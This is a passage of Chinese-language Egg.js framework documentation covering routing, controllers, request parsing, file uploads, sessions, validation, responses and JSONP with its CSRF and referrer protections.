// curl http://127.0.0.1:7001/user/123/xiaoming
复杂参数的获取
路由里面也支持定义正则，可以更加灵活的获取参数：

// app/router.js
module.exports = app => {
	app.router.get(/^\/package\/([\w-.]+\/[\w-.]+)$/, app.controller.package.detail);
};

// app/controller/package.js
exports.detail = async ctx => {
	// 如果请求 URL 被正则匹配， 可以按照捕获分组的顺序，从 ctx.params 中获取。
	// 按照下面的用户请求，`ctx.params[0]` 的 内容就是 `egg/1.0.0`
	ctx.body = `package:${ctx.params[0]}`;
};

// curl http://127.0.0.1:7001/package/egg/1.0.0

 表单内容的获取
// app/router.js
module.exports = app => {
	app.router.post('/form', app.controller.form.post);
};

// app/controller/form.js
exports.post = async ctx => {
	ctx.body = `body: ${JSON.stringify(ctx.request.body)}`;
};

// 模拟发起 post 请求。
// curl -X POST http://127.0.0.1:7001/form --data '{"name":"controller"}' --header 'Content-Type:application/json'
附：

这里直接发起 POST 请求会报错：'secret is missing'。错误信息来自 koa-csrf/index.js#L69 。

原因：框架内部针对表单 POST 请求均会验证 CSRF 的值，因此我们在表单提交时，请带上 CSRF key 进行提交，可参考安全威胁csrf的防范

注意：上面的校验是因为框架中内置了安全插件 egg-security，提供了一些默认的安全实践，并且框架的安全插件是默认开启的，如果需要关闭其中一些安全防范，直接设置该项的 enable 属性为 false 即可。

「除非清楚的确认后果，否则不建议擅自关闭安全插件提供的功能。」

这里在写例子的话可临时在 config/config.default.js 中设置

exports.security = {
	csrf: false
};


 表单校验
// app/router.js
module.exports = app => {
	app.router.post('/user', app.controller.user);
};

// app/controller/user.js
const createRule = {
	username: {
		type: 'email',
	},
	password: {
		type: 'password',
		compare: 're-password',
	},
};

exports.create = async ctx => {
	// 如果校验报错，会抛出异常
	ctx.validate(createRule);
	ctx.body = ctx.request.body;
};

// curl -X POST http://127.0.0.1:7001/user --data 'username=abc@abc.com&password=111111&re-password=111111'
重定向
内部重定向
// app/router.js
module.exports = app => {
	app.router.get('index', '/home/index', app.controller.home.index);
	app.router.redirect('/', '/home/index', 302);
};

// app/controller/home.js
exports.index = async ctx => {
	ctx.body = 'hello controller';
};

// curl -L http://localhost:7001
外部重定向
// app/router.js
module.exports = app => {
	app.router.get('/search', app.controller.search.index);
};

// app/controller/search.js
exports.index = async ctx => {
	const type = ctx.query.type;
	const q = ctx.query.q || 'nodejs';

	if (type === 'bing') {
		ctx.redirect(`http://cn.bing.com/search?q=${q}`);
	} else {
		ctx.redirect(`https://www.google.co.kr/search?q=${q}`);
	}
};

// curl http://localhost:7001/search?type=bing&q=node.js
// curl http://localhost:7001/search?q=node.js

中间件的使用
如果我们想把用户某一类请求的参数都大写，可以通过中间件来实现。 这里我们只是简单说明下如何使用中间件，更多请查看 中间件。

// app/controller/search.js
exports.index = async ctx => {
	ctx.body = `search: ${ctx.query.name}`;
};

// app/middleware/uppercase.js
module.exports = () => {
	return async function uppercase(ctx, next) {
		ctx.query.name = ctx.query.name && ctx.query.name.toUpperCase();
		await next();
	};
};

// app/router.js
module.exports = app => {
	app.router.get('s', '/search', app.middlewares.uppercase(), app.controller.search)
};

// curl http://localhost:7001/search?name=egg

太多路由映射?
  如上所述，我们并不建议把路由规则逻辑散落在多个地方，会给排查问题带来困扰。

若确实有需求，可以如下拆分：

// app/router.js
module.exports = app => {
	require('./router/news')(app);
	require('./router/admin')(app);
};

// app/router/news.js
module.exports = app => {
	app.router.get('/news/list', app.controller.news.list);
	app.router.get('/news/detail', app.controller.news.detail);
};

// app/router/admin.js
module.exports = app => {
	app.router.get('/admin/user', app.controller.admin.user);
	app.router.get('/admin/log', app.controller.admin.log);
};
也可直接使用 egg-router-plus。

-------------------------------
Controller

Controller 负责解析用户的输入，处理后返回相应的结果，例如

在 RESTful 接口中，Controller 接受用户的参数，从数据库中查找内容返回给用户或者将用户的请求更新到数据库中。
在 HTML 页面请求中，Controller 根据用户访问不同的 URL，渲染不同的模板得到 HTML 返回给用户。
在代理服务器中，Controller 将用户的请求转发到其他服务器上，并将其他服务器的处理结果返回给用户。
框架推荐 Controller 层主要对用户的请求参数进行处理（校验、转换），然后调用对应的 service 方法处理业务，得到业务结果后封装并返回：

获取用户通过 HTTP 传递过来的请求参数。
校验、组装参数。
调用 Service 进行业务处理，必要时处理转换 Service 的返回结果，让它适应用户的需求。
通过 HTTP 将结果响应给用户。

如何编写 Controller
所有的 Controller 文件都必须放在 app/controller 目录下，可以支持多级目录，访问的时候可以通过目录名级联访问。Controller 支持多种形式进行编写，可以根据不同的项目场景和开发习惯来选择。

 Controller 类（推荐）
我们可以通过定义 Controller 类的方式来编写代码：

// app/controller/post.js
const Controller = require('egg').Controller;
class PostController extends Controller {
	async create() {
		const { ctx, service  } = this;
		const createRule = {
			title: { type: 'string'  },
			content: { type: 'string'  },
		};
		// 校验参数
		ctx.validate(createRule);
		// 组装参数
		const author = ctx.session.userId;
		const req = Object.assign(ctx.request.body, { author  });
		// 调用 Service 进行业务处理
		const res = await service.post.create(req);
		// 设置响应内容和响应状态码
		ctx.body = { id: res.id  };
		ctx.status = 201;
	}
}
module.exports = PostController;
我们通过上面的代码定义了一个 PostController 的类，类里面的每一个方法都可以作为一个 Controller 在 Router 中引用到，我们可以从 app.controller 根据文件名和方法名定位到它。

// app/router.js
module.exports = app => {
	const { router, controller  } = app;
	router.post('createPost', '/api/posts', controller.post.create);
}
Controller 支持多级目录，例如如果我们将上面的 Controller 代码放到 app/controller/sub/post.js 中，则可以在 router 中这样使用：

// app/router.js
module.exports = app => {
	app.router.post('createPost', '/api/posts', app.controller.sub.post.create);
}
定义的 Controller 类，会在每一个请求访问到 server 时实例化一个全新的对象，而项目中的 Controller 类继承于 egg.Controller，会有下面几个属性挂在 this 上。

this.ctx: 当前请求的上下文 Context 对象的实例，通过它我们可以拿到框架封装好的处理当前请求的各种便捷属性和方法。
this.app: 当前应用 Application 对象的实例，通过它我们可以拿到框架提供的全局对象和方法。
this.service：应用定义的 Service，通过它我们可以访问到抽象出的业务层，等价于 this.ctx.service 。
this.config：应用运行时的配置项。
this.logger：logger 对象，上面有四个方法（debug，info，warn，error），分别代表打印四个不同级别的日志，使用方法和效果与 context logger 中介绍的一样，但是通过这个 logger 对象记录的日志，在日志前面会加上打印该日志的文件路径，以便快速定位日志打印位置。

自定义 Controller 基类
按照类的方式编写 Controller，不仅可以让我们更好的对 Controller 层代码进行抽象（例如将一些统一的处理抽象成一些私有方法），还可以通过自定义 Controller 基类的方式封装应用中常用的方法。

// app/core/base_controller.js
const { Controller  } = require('egg');
class BaseController extends Controller {
	get user() {
		return this.ctx.session.user;
	}

	success(data) {
		this.ctx.body = {
			success: true,
			data,
		};
	}

	notFound(msg) {
		msg = msg || 'not found';
		this.ctx.throw(404, msg);
	}
}
module.exports = BaseController;
此时在编写应用的 Controller 时，可以继承 BaseController，直接使用基类上的方法：

//app/controller/post.js
const Controller = require('../core/base_controller');
class PostController extends Controller {
	async list() {
		const posts = await this.service.listByUser(this.user);
		this.success(posts);
	}
}

# Controller里的HTTP 基础
由于 Controller 基本上是业务开发中唯一和 HTTP 协议打交道的地方，在继续往下了解之前，我们首先简单的看一下 HTTP 协议是怎样的。

如果我们发起一个 HTTP 请求来访问前面例子中提到的 Controller：

curl -X POST http://localhost:3000/api/posts --data '{"title":"controller", "content": "what is controller"}' --header 'Content-Type:application/json; charset=UTF-8'
通过 curl 发出的 HTTP 请求的内容就会是下面这样的：

POST /api/posts HTTP/1.1
Host: localhost:3000
Content-Type: application/json; charset=UTF-8

{"title": "controller", "content": "what is controller"}
请求的第一行包含了三个信息，我们比较常用的是前面两个：

method：这个请求中 method 的值是 POST。
path：值为 /api/posts，如果用户的请求中包含 query，也会在这里出现
从第二行开始直到遇到的第一个空行位置，都是请求的 Headers 部分，这一部分中有许多常用的属性，包括这里看到的 Host，Content-Type，还有 Cookie，User-Agent 等等。在这个请求中有两个头：

Host：我们在浏览器发起请求的时候，域名会用来通过 DNS 解析找到服务的 IP 地址，但是浏览器也会将域名和端口号放在 Host 头中一并发送给服务端。
Content-Type：当我们的请求有 body 的时候，都会有 Content-Type 来标明我们的请求体是什么格式的。
之后的内容全部都是请求的 body，当请求是 POST, PUT, DELETE 等方法的时候，可以带上请求体，服务端会根据 Content-Type 来解析请求体。

在服务端处理完这个请求后，会发送一个 HTTP 响应给客户端

HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
Content-Length: 8
Date: Mon, 09 Jan 2017 08:40:28 GMT
Connection: keep-alive

{"id": 1}
第一行中也包含了三段，其中我们常用的主要是响应状态码，这个例子中它的值是 201，它的含义是在服务端成功创建了一条资源。

和请求一样，从第二行开始到下一个空行之间都是响应头，这里的 Content-Type, Content-Length 表示这个响应的格式是 JSON，长度为 8 个字节。

最后剩下的部分就是这次响应真正的内容。

获取 HTTP 请求参数
从上面的 HTTP 请求示例中可以看到，有好多地方可以放用户的请求数据，框架通过在 Controller 上绑定的 Context 实例，提供了许多便捷方法和属性获取用户通过 HTTP 请求发送过来的参数。

 query
在 URL 中 ? 后面的部分是一个 Query String，这一部分经常用于 GET 类型的请求中传递参数。例如 GET /posts?category=egg&language=node 中 category=egg&language=node 就是用户传递过来的参数。我们可以通过 ctx.query 拿到解析过后的这个参数体

class PostController extends Controller {
  async listPosts() {
		const query = this.ctx.query;
		{
			//   category: 'egg',
			//   language: 'node',
			// }
		}
	}
当 Query String 中的 key 重复时，ctx.query 只取 key 第一次出现时的值，后面再出现的都会被忽略。GET /posts?category=egg&category=koa 通过 ctx.query 拿到的值是 { category: 'egg'  }。

这样处理的原因是为了保持统一性，由于通常情况下我们都不会设计让用户传递 key 相同的 Query String，所以我们经常会写类似下面的代码：

const key = ctx.query.key || '';
if (key.startsWith('egg')) {
		// do something
	//
}
而如果有人故意发起请求在 Query String 中带上重复的 key 来请求时就会引发系统异常。因此框架保证了从 ctx.query 上获取的参数一旦存在，一定是字符串类型。

queries
有时候我们的系统会设计成让用户传递相同的 key，例如 GET /posts?category=egg&id=1&id=2&id=3。针对此类情况，框架提供了 ctx.queries 对象，这个对象也解析了 Query String，但是它不会丢弃任何一个重复的数据，而是将他们都放到一个数组中：

// GET /posts?category=egg&id=1&id=2&id=3
class PostController extends Controller {
	async listPosts() {
		console.log(this.ctx.queries);
		// {
		//   category: [ 'egg'  ],
		//   id: [ '1', '2', '3'  ],
		// }
	}
}
ctx.queries 上所有的 key 如果有值，也一定会是数组类型。


Router params
在 Router 中，我们介绍了 Router 上也可以申明参数，这些参数都可以通过 ctx.params 获取到。

// app.get('/projects/:projectId/app/:appId', 'app.listApp');
// GET /projects/1/app/2
class AppController extends Controller {
	async listApp() {
		assert.equal(this.ctx.params.projectId, '1');
		assert.equal(this.ctx.params.appId, '2');
	}
}

body
虽然我们可以通过 URL 传递参数，但是还是有诸多限制：

浏览器中会对 URL 的长度有所限制，如果需要传递的参数过多就会无法传递。
服务端经常会将访问的完整 URL 记录到日志文件中，有一些敏感数据通过 URL 传递会不安全。
在前面的 HTTP 请求报文示例中，我们看到在 header 之后还有一个 body 部分，我们通常会在这个部分传递 POST、PUT 和 DELETE 等方法的参数。一般请求中有 body 的时候，客户端（浏览器）会同时发送 Content-Type 告诉服务端这次请求的 body 是什么格式的。Web 开发中数据传递最常用的两类格式分别是 JSON 和 Form。

框架内置了 bodyParser 中间件来对这两类格式的请求 body 解析成 object 挂载到 ctx.request.body 上。HTTP 协议中并不建议在通过 GET、HEAD 方法访问时传递 body，所以我们无法在 GET、HEAD 方法中按照此方法获取到内容。

// POST /api/posts HTTP/1.1
// Host: localhost:3000
// Content-Type: application/json; charset=UTF-8
// {"title": "controller", "content": "what is controller"}
class PostController extends Controller {
	async listPosts() {
		assert.equal(this.ctx.request.body.title, 'controller');
		assert.equal(this.ctx.request.body.content, 'what is controller');
	}
}
框架对 bodyParser 设置了一些默认参数，配置好之后拥有以下特性：

当请求的 Content-Type 为 application/json，application/json-patch+json，application/vnd.api+json 和 application/csp-report 时，会按照 json 格式对请求 body 进行解析，并限制 body 最大长度为 100kb。
当请求的 Content-Type 为 application/x-www-form-urlencoded 时，会按照 form 格式对请求 body 进行解析，并限制 body 最大长度为 100kb。
如果解析成功，body 一定会是一个 Object（可能是一个数组）。
一般来说我们最经常调整的配置项就是变更解析时允许的最大长度，可以在 config/config.default.js 中覆盖框架的默认值。

module.exports = {
bodyParser: {
  jsonLimit: '1mb',
  formLimit: '1mb',
},
};
如果用户的请求 body 超过了我们配置的解析最大长度，会抛出一个状态码为 413 的异常，如果用户请求的 body 解析失败（错误的 JSON），会抛出一个状态码为 400 的异常。

注意：在调整 bodyParser 支持的 body 长度时，如果我们应用前面还有一层反向代理（Nginx），可能也需要调整它的配置，确保反向代理也支持同样长度的请求 body。

一个常见的错误是把 ctx.request.body 和 ctx.body 混淆，后者其实是 ctx.response.body 的简写。

# 传文件!
获取上传的文件
请求 body 除了可以带参数之外，还可以发送文件，一般来说，浏览器上都是通过 Multipart/form-data 格式发送文件的，框架通过内置 Multipart 插件来支持获取用户上传的文件。

完整的上传示例参见：eggjs/examples/multipart。

在 Controller 中，我们可以通过 ctx.getFileStream() 接口能获取到上传的文件流。

<form method="POST" action="/upload?_csrf={{ ctx.csrf | safe  }}" enctype="multipart/form-data">
  title: <input name="title" />
  file: <input name="file" type="file" />
  <button type="submit">上传</button>
</form>

const path = require('path');
const sendToWormhole = require('stream-wormhole');
const Controller = require('egg').Controller;

class UploaderController extends Controller {
  async upload() {
    const ctx = this.ctx;
    const stream = await ctx.getFileStream();
    const name = 'egg-multipart-test/' + path.basename(stream.filename);
    // 文件处理，上传到云存储等等
    let result;
    try {
      result = await ctx.oss.put(name, stream);
    } catch (err) {
      // 必须将上传的文件流消费掉，要不然浏览器响应会卡死
      await sendToWormhole(stream);
      throw err;
    }

    ctx.body = {
      url: result.url,
      // 所有表单字段都能通过 `stream.fields` 获取到
      fields: stream.fields,
    };
  }
}

module.exports = UploaderController;

要通过 ctx.getFileStream 便捷的获取到用户上传的文件，需要满足两个条件：

只支持上传一个文件。
上传文件必须在所有其他的 fields 后面，否则在拿到文件流时可能还获取不到 fields。
如果要获取同时上传的多个文件，不能通过 ctx.getFileStream() 来获取，只能通过下面这种方式：

const sendToWormhole = require('stream-wormhole');
const Controller = require('egg').Controller;

class UploaderController extends Controller {
  async upload() {
    const ctx = this.ctx;
    const parts = ctx.multipart();
    let part;
    // parts() return a promise
    while ((part = await parts()) != null) {
      if (part.length) {
        // 如果是数组的话是 filed
        console.log('field: ' + part[0]);
        console.log('value: ' + part[1]);
        console.log('valueTruncated: ' + part[2]);
        console.log('fieldnameTruncated: ' + part[3]);
      } else {
        if (!part.filename) {
          // 这时是用户没有选择文件就点击了上传(part 是 file stream，但是 part.filename 为空)
          // 需要做出处理，例如给出错误提示消息
          return;
        }
        // part 是上传的文件流
        console.log('field: ' + part.fieldname);
        console.log('filename: ' + part.filename);
        console.log('encoding: ' + part.encoding);
        console.log('mime: ' + part.mime);
        // 文件处理，上传到云存储等等
        let result;
        try {
          result = await ctx.oss.put('egg-multipart-test/' + part.filename, part);
        } catch (err) {
          // 必须将上传的文件流消费掉，要不然浏览器响应会卡死
          await sendToWormhole(part);
          throw err;
        }
        console.log(result);
      }
    }
    console.log('and we are done parsing the form!');
  }
}

module.exports = UploaderController;
为了保证文件上传的安全，框架限制了支持的的文件格式，框架默认支持白名单如下：

// images
'.jpg', '.jpeg', // image/jpeg
'.png', // image/png, image/x-png
'.gif', // image/gif
'.bmp', // image/bmp
'.wbmp', // image/vnd.wap.wbmp
'.webp',
'.tif',
'.psd',
// text
'.svg',
'.js', '.jsx',
'.json',
'.css', '.less',
'.html', '.htm',
'.xml',
// tar
'.zip',
'.gz', '.tgz', '.gzip',
// video
'.mp3',
'.mp4',
'.avi',
用户可以通过在 config/config.default.js 中配置来新增支持的文件扩展名，或者重写整个白名单

新增支持的文件扩展名
module.exports = {
  multipart: {
    fileExtensions: [ '.apk' ], // 增加对 .apk 扩展名的支持
  },
};
覆盖整个白名单
module.exports = {
  multipart: {
    whitelist: [ '.png' ], // 覆盖整个白名单，只允许上传 '.png' 格式
  },
};
注意：当传递了 whitelist 属性时，fileExtensions 属性不生效。

## header
除了从 URL 和请求 body 上获取参数之外，还有许多参数是通过请求 header 传递的。框架提供了一些辅助属性和方法来获取。

ctx.headers，ctx.header，ctx.request.headers，ctx.request.header：这几个方法是等价的，都是获取整个 header 对象。
ctx.get(name)，ctx.request.get(name)：获取请求 header 中的一个字段的值，如果这个字段不存在，会返回空字符串。
我们建议用 ctx.get(name) 而不是 ctx.headers['name']，因为前者会自动处理大小写。
由于 header 比较特殊，有一些是 HTTP 协议规定了具体含义的（例如 Content-Type，Accept），有些是反向代理设置的，已经约定俗成（X-Forwarded-For），框架也会对他们增加一些便捷的 getter，详细的 getter 可以查看 API 文档。

特别是如果我们通过 config.proxy = true 设置了应用部署在反向代理（Nginx）之后，有一些 Getter 的内部处理会发生改变。

 ctx.host
优先读通过 config.hostHeaders 中配置的 header 的值，读不到时再尝试获取 host 这个 header 的值，如果都获取不到，返回空字符串。

config.hostHeaders 默认配置为 x-forwarded-host。

 ctx.protocol
通过这个 Getter 获取 protocol 时，首先会判断当前连接是否是加密连接，如果是加密连接，返回 https。

如果处于非加密连接时，优先读通过 config.protocolHeaders 中配置的 header 的值来判断是 HTTP 还是 https，如果读取不到，我们可以在配置中通过 config.protocol 来设置兜底值，默认为 HTTP。

config.protocolHeaders 默认配置为 x-forwarded-proto。

 ctx.ips
通过 ctx.ips 获取请求经过所有的中间设备 IP 地址列表，只有在 config.proxy = true 时，才会通过读取 config.ipHeaders 中配置的 header 的值来获取，获取不到时为空数组。

config.ipHeaders 默认配置为 x-forwarded-for。

 ctx.ip
通过 ctx.ip 获取请求发起方的 IP 地址，优先从 ctx.ips 中获取，ctx.ips 为空时使用连接上发起方的 IP 地址。

注意：ip 和 ips 不同，ip 当 config.proxy = false 时会返回当前连接发起者的 ip 地址，ips 此时会为空数组。


## Cookie 和 Session
Cookie
HTTP 请求都是无状态的，但是我们的 Web 应用通常都需要知道发起请求的人是谁。为了解决这个问题，HTTP 协议设计了一个特殊的请求头：Cookie。服务端可以通过响应头（set-cookie）将少量数据响应给客户端，浏览器会遵循协议将数据保存，并在下次请求同一个服务的时候带上（浏览器也会遵循协议，只在访问符合 Cookie 指定规则的网站时带上对应的 Cookie 来保证安全性）。

通过 ctx.cookies，我们可以在 Controller 中便捷、安全的设置和读取 Cookie。

class CookieController extends Controller {
  async add() {
    const ctx = this.ctx;
    const count = ctx.cookies.get('count');
    count = count ? Number(count) : 0;
    ctx.cookies.set('count', ++count);
    ctx.body = count;
  }

  async remove() {
    const ctx = this.ctx;
    const count = ctx.cookies.set('count', null);
    ctx.status = 204;
  }
}
Cookie 虽然在 HTTP 中只是一个头，但是通过 foo=bar;foo1=bar1; 的格式可以设置多个键值对。

Cookie 在 Web 应用中经常承担了传递客户端身份信息的作用，因此有许多安全相关的配置，不可忽视，Cookie 文档中详细介绍了 Cookie 的用法和安全相关的配置项，可以深入阅读了解。

 Session
通过 Cookie，我们可以给每一个用户设置一个 Session，用来存储用户身份相关的信息，这份信息会加密后存储在 Cookie 中，实现跨请求的用户身份保持。

框架内置了 Session 插件，给我们提供了 ctx.session 来访问或者修改当前用户 Session 。

class PostController extends Controller {
  async fetchPosts() {
    const ctx = this.ctx;
    // 获取 Session 上的内容
    const userId = ctx.session.userId;
    const posts = await ctx.service.post.fetch(userId);
    // 修改 Session 的值
    ctx.session.visited = ctx.session.visited ? ++ctx.session.visited : 1;
    ctx.body = {
      success: true,
      posts,
    };
  }
}
Session 的使用方法非常直观，直接读取它或者修改它就可以了，如果要删除它，直接将它赋值为 null：

class SessionController extends Controller {
  async deleteSession() {
    this.ctx.session = null;
  }
};
和 Cookie 一样，Session 也有许多安全等选项和功能，在使用之前也最好阅读 Session 文档深入了解。

 配置
对于 Session 来说，主要有下面几个属性可以在 config.default.js 中进行配置:

module.exports = {
  key: 'EGG_SESS', // 承载 Session 的 Cookie 键值对名字
  maxAge: 86400000, // Session 的最大有效时间
};


Session使用redis 以外的作存储
扩展存储
Session 默认存放在 Cookie 中，但是如果我们的 Session 对象过于庞大，就会带来一些额外的问题：

前面提到，浏览器通常都有限制最大的 Cookie 长度，当设置的 Session 过大时，浏览器可能拒绝保存。
Cookie 在每次请求时都会带上，当 Session 过大时，每次请求都要额外带上庞大的 Cookie 信息。
框架提供了将 Session 存储到除了 Cookie 之外的其他存储的扩展方案，我们只需要设置 app.sessionStore 即可将 Session 存储到指定的存储中。

// app.js
module.exports = app => {
  app.sessionStore = {
    // support promise / async
    async get (key) {
      // return value;
    },
    async set (key, value, maxAge) {
      // set key to store
    },
    async destroy (key) {
      // destroy key
    },
  };
};
sessionStore 的实现我们也可以封装到插件中，例如 egg-session-redis 就提供了将 Session 存储到 redis 中的能力，在应用层，我们只需要引入 egg-redis 和 egg-session-redis 插件即可。

// plugin.js
exports.redis = {
  enable: true,
  package: 'egg-redis',
};
exports.sessionRedis = {
  enable: true,
  package: 'egg-session-redis',
};
注意：一旦选择了将 Session 存入到外部存储中，就意味着系统将强依赖于这个外部存储，当它挂了的时候，我们就完全无法使用 Session 相关的功能了。因此我们更推荐大家只将必要的信息存储在 Session 中，保持 Session 的精简并使用默认的 Cookie 存储，用户级别的缓存不要存储在 Session 中。

 Session 实践
 修改用户 Session 失效时间
虽然在 Session 的配置中有一项是 maxAge，但是它只能全局设置 Session 的有效期，我们经常可以在一些网站的登陆页上看到有 记住我 的选项框，勾选之后可以让登陆用户的 Session 有效期更长。这种针对特定用户的 Session 有效时间设置我们可以通过 ctx.session.maxAge= 来实现。

const ms = require('ms');
class UserController extends Controller {
  async login() {
    const ctx = this.ctx;
    const { username, password, rememberMe } = ctx.request.body;
    const user = await ctx.loginAndGetUser(username, password);

    // 设置 Session
    ctx.session.user = user;
    // 如果用户勾选了 `记住我`，设置 30 天的过期时间
    if (rememberMe) ctx.session.maxAge = ms('30d');
  }
}
 延长用户 Session 有效期
默认情况下，当用户请求没有导致 Session 被修改时，框架都不会延长 Session 的有效期，但是在有些场景下，我们希望用户如果长时间都在访问我们的站点，则延长他们的 Session 有效期，不让用户退出登录态。框架提供了一个 renew 配置项用于实现此功能，它会在发现当用户 Session 的有效期仅剩下最大有效期一半的时候，重置 Session 的有效期。

// config/config.default.js
module.exports = {
  session: {
    renew: true,
  },
};


## 参数校验
在获取到用户请求的参数后，不可避免的要对参数进行一些校验。

借助 Validate 插件提供便捷的参数校验机制，帮助我们完成各种复杂的参数校验。

// config/plugin.js
exports.validate = {
  enable: true,
  package: 'egg-validate',
};
通过 ctx.validate(rule, [body]) 直接对参数进行校验：

class PostController extends Controller {
  async create() {
    // 校验参数
    // 如果不传第二个参数会自动校验 `ctx.request.body`
    this.ctx.validate({
      title: { type: 'string' },
      content: { type: 'string' },
    });
  }
}
当校验异常时，会直接抛出一个异常，异常的状态码为 422，errors 字段包含了详细的验证不通过信息。如果想要自己处理检查的异常，可以通过 try catch 来自行捕获。

class PostController extends Controller {
  async create() {
    const ctx = this.ctx;
    try {
      ctx.validate(createRule);
    } catch (err) {
      ctx.logger.warn(err.errors);
      ctx.body = { success: false };
      return;
    }
  }
};
 校验规则
参数校验通过 Parameter 完成，支持的校验规则可以在该模块的文档中查阅到。

 自定义校验规则
除了上一节介绍的内置检验类型外，有时候我们希望自定义一些校验规则，让开发时更便捷，此时可以通过 app.validator.addRule(type, check) 的方式新增自定义规则。

// app.js
app.validator.addRule('json', (rule, value) => {
  try {
    JSON.parse(value);
  } catch (err) {
    return 'must be json string';
  }
});
添加完自定义规则之后，就可以在 Controller 中直接使用这条规则来进行参数校验了

class PostController extends Controller {
  async handler() {
    const ctx = this.ctx;
    // query.test 字段必须是 json 字符串
    const rule = { test: 'json' };
    ctx.validate(rule, ctx.query);
  }
};

 调用 Service
我们并不想在 Controller 中实现太多业务逻辑，所以提供了一个 Service 层进行业务逻辑的封装，这不仅能提高代码的复用性，同时可以让我们的业务逻辑更好测试。

在 Controller 中可以调用任何一个 Service 上的任何方法，同时 Service 是懒加载的，只有当访问到它的时候框架才会去实例化它。

class PostController extends Controller {
  async create() {
    const ctx = this.ctx;
    const author = ctx.session.userId;
    const req = Object.assign(ctx.request.body, { author });
    // 调用 service 进行业务处理
    const res = await ctx.service.post.create(req);
    ctx.body = { id: res.id };
    ctx.status = 201;
  }
}
Service 的具体写法，请查看 Service 章节。

## 发送响应 Response

发送 HTTP 响应
当业务逻辑完成之后，Controller 的最后一个职责就是将业务逻辑的处理结果通过 HTTP 响应发送给用户。

 设置 status
HTTP 设计了非常多的状态码，每一个状态码都代表了一个特定的含义，通过设置正确的状态码，可以让响应更符合语义。

框架提供了一个便捷的 Setter 来进行状态码的设置

class PostController extends Controller {
  async create() {
    // 设置状态码为 201
    this.ctx.status = 201;
  }
};
具体什么场景设置什么样的状态码，可以参考 List of HTTP status codes 中各个状态码的含义。

 设置 body
绝大多数的数据都是通过 body 发送给请求方的，和请求中的 body 一样，在响应中发送的 body，也需要有配套的 Content-Type 告知客户端如何对数据进行解析。

作为一个 RESTful 的 API 接口 controller，我们通常会返回 Content-Type 为 application/json 格式的 body，内容是一个 JSON 字符串。
作为一个 html 页面的 controller，我们通常会返回 Content-Type 为 text/html 格式的 body，内容是 html 代码段。
注意：ctx.body 是 ctx.response.body 的简写，不要和 ctx.request.body 混淆了。

class ViewController extends Controller {
  async show() {
    this.ctx.body = {
      name: 'egg',
      category: 'framework',
      language: 'Node.js',
    };
  }

  async page() {
    this.ctx.body = '<html><h1>Hello</h1></html>';
  }
}
由于 Node.js 的流式特性，我们还有很多场景需要通过 Stream 返回响应，例如返回一个大文件，代理服务器直接返回上游的内容，框架也支持直接将 body 设置成一个 Stream，并会同时处理好这个 Stream 上的错误事件。

class ProxyController extends Controller {
  async proxy() {
    const ctx = this.ctx;
    const result = await ctx.curl(url, {
      streaming: true,
    });
    ctx.set(result.header);
    // result.res 是一个 stream
    ctx.body = result.res;
  }
};
 渲染模板
通常来说，我们不会手写 HTML 页面，而是会通过模板引擎进行生成。 框架自身没有集成任何一个模板引擎，但是约定了 View 插件的规范，通过接入的模板引擎，可以直接使用 ctx.render(template) 来渲染模板生成 html。

class HomeController extends Controller {
  async index() {
    const ctx = this.ctx;
    await ctx.render('home.tpl', { name: 'egg' });
    // ctx.body = await ctx.renderString('hi, {{ name }}', { name: 'egg' });
  }
};
具体示例可以查看模板渲染。

 JSONP
有时我们需要给非本域的页面提供接口服务，又由于一些历史原因无法通过 CORS 实现，可以通过 JSONP 来进行响应。

由于 JSONP 如果使用不当会导致非常多的安全问题，所以框架中提供了便捷的响应 JSONP 格式数据的方法，封装了 JSONP XSS 相关的安全防范，并支持进行 CSRF 校验和 referrer 校验。

通过 app.jsonp() 提供的中间件来让一个 controller 支持响应 JSONP 格式的数据。在路由中，我们给需要支持 jsonp 的路由加上这个中间件：
// app/router.js
module.exports = app => {
  const jsonp = app.jsonp();
  app.router.get('/api/posts/:id', jsonp, app.controller.posts.show);
  app.router.get('/api/posts', jsonp, app.controller.posts.list);
};
在 Controller 中，只需要正常编写即可：
// app/controller/posts.js
class PostController extends Controller {
  async show() {
    this.ctx.body = {
      name: 'egg',
      category: 'framework',
      language: 'Node.js',
    };
  }
}
用户请求对应的 URL 访问到这个 controller 的时候，如果 query 中有 _callback=fn 参数，将会返回 JSONP 格式的数据，否则返回 JSON 格式的数据。

 JSONP 配置
框架默认通过 query 中的 _callback 参数作为识别是否返回 JSONP 格式数据的依据，并且 _callback 中设置的方法名长度最多只允许 50 个字符。应用可以在 config/config.default.js 全局覆盖默认的配置：

// config/config.default.js
exports.jsonp = {
  callback: 'callback', // 识别 query 中的 `callback` 参数
  limit: 100, // 函数名最长为 100 个字符
};
通过上面的方式配置之后，如果用户请求 /api/posts/1?callback=fn，响应为 JSONP 格式，如果用户请求 /api/posts/1，响应格式为 JSON。

我们同样可以在 app.jsonp() 创建中间件时覆盖默认的配置，以达到不同路由使用不同配置的目的：

// app/router.js
module.exports = app => {
  const { router, controller, jsonp } = app;
  router.get('/api/posts/:id', jsonp({ callback: 'callback' }), controller.posts.show);
  router.get('/api/posts', jsonp({ callback: 'cb' }), controller.posts.list);
};
 跨站防御配置
默认配置下，响应 JSONP 时不会进行任何跨站攻击的防范，在某些情况下，这是很危险的。我们初略将 JSONP 接口分为三种类型：

查询非敏感数据，例如获取一个论坛的公开文章列表。
查询敏感数据，例如获取一个用户的交易记录。
提交数据并修改数据库，例如给某一个用户创建一笔订单。
如果我们的 JSONP 接口提供下面两类服务，在不做任何跨站防御的情况下，可能泄露用户敏感数据甚至导致用户被钓鱼。因此框架给 JSONP 默认提供了 CSRF 校验支持和 referrer 校验支持。

 CSRF
在 JSONP 配置中，我们只需要打开 csrf: true，即可对 JSONP 接口开启 CSRF 校验。

// config/config.default.js
module.exports = {
  jsonp: {
    csrf: true,
  },
};
注意，CSRF 校验依赖于 security 插件提供的基于 Cookie 的 CSRF 校验。

在开启 CSRF 校验时，客户端在发起 JSONP 请求时，也要带上 CSRF token，如果发起 JSONP 的请求方所在的页面和我们的服务在同一个主域名之下的话，可以读取到 Cookie 中的 CSRF token（在 CSRF token 缺失时也可以自行设置 CSRF token 到 Cookie 中），并在请求时带上该 token。

 referrer 校验
如果在同一个主域之下，可以通过开启 CSRF 的方式来校验 JSONP 请求的来源，而如果想对其他域名的网页提供 JSONP 服务，我们可以通过配置 referrer 白名单的方式来限制 JSONP 的请求方在可控范围之内。

//config/config.default.js
exports.jsonp = {
  whiteList: /^https?:\/\/test.com\//,
  // whiteList: '.test.com',
  // whiteList: 'sub.test.com',
